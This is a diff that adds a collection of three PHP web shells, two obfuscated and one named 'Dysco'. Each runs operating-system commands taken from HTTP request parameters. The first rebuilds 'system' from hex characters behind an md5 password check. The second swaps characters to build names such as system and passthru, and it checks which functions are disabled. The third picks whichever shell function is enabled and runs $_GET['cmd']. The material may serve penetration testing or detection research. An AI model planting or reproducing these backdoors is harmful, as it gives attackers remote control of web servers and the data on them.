@@ -1,0 +1,109 @@
+#OBFUSCATED1
+<?php
+$pass = "9cdfb439c7876e703e307864c9167a15"; //lol 
+$A = chr(0x73);
+$B = chr(0x79);
+$X = chr(0x74);
+$D = chr(0x65);
+$E = chr(0x6d);
+$hook = $A.$B.$A.$X.$D.$E;
+if($pass == md5($_POST['password']))
+{
+  $hook($_POST['cmd']);
+}
+else
+{
+  die();
+}
+?>
+
+
+
+
+
+#OBFUSCATED2
+$S=array(m("ncoai","msyte", "cocain"),m("sir","cex","iris"),m("otab","lshe","taboo")."_".m("sir","cex","iris"),m("gbledin","upasthr","bleeding"));
+$TR=m("etroubl","edisabl","trouble");$MK=m("dpreambl","sfunctio","preambled");$D=explode(",",ini_get($TR.'_'.$MK));$P=$_REQUEST;
+function m($a,$b,$c) {return str_replace(str_split($a), str_split($b), $c);}
+foreach($S as $A) {
+    if(!in_array($A, $D)) {
+        if($A == m("ncoai","msyte","cocain")) $A($P['lol']);
+        elseif($A == m("sir","cex","iris")) {
+            exec("$P 2>&1", $arr);
+            echo join("\n",$arr)."\n";
+        } else echo $A($P['lol']);
+        exit;
+    }
+}
+
+
+
+
+
+#DYNAMIC1
+<?php
+/*
+ * Dysco(Dynamic PHP Shell Command for RCE)
+ * Created by Petruknisme @2020
+ * Contact: me@petruknisme.com
+ */
+function Dysco($command)
+{
+    $list_function_shell = array("system", "exec", "shell_exec", "passthru", "eval");
+    $f_enabled = array_filter($list_function_shell, 'function_exists');
+    
+    echo "Enabled Function:\n<br/>";
+    foreach($f_enabled as $f)
+    {
+        echo $f." ";
+    }
+    if($f_enabled !== ""){
+        $f = $f_enabled[0];
+        echo "<br/>\nUsing ". $f. " as shell command\n<br/>";
+         
+        if($f == "system" || $f == "passthru"){
+            // disable multiple output for system
+            ob_start();
+            $output =  $f($command, $status);
+            ob_clean(); 
+        }
+        else if($f == "exec"){
+            $f($command, $output, $status);
+            $output = implode("n", $output);
+        }
+        else if($f == "shell_exec"){
+            $output = $f($command);
+        }
+        else{
+            $output = "Command execution not possible. All supported function is disabled.";
+            $status = 1;
+        }
+ 
+    }
+    return array('output' => $output , 'status' => $status);
+}
+// for HTTP GET use this.
+if(isset($_GET['cmd'])){
+    $o = Dysco($_GET['cmd']);
+    echo $o['output'];
+}
+// for debugging in local, use this
+//$o = shell_spawn('uname -a');
+//echo $o['output'];
+?>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
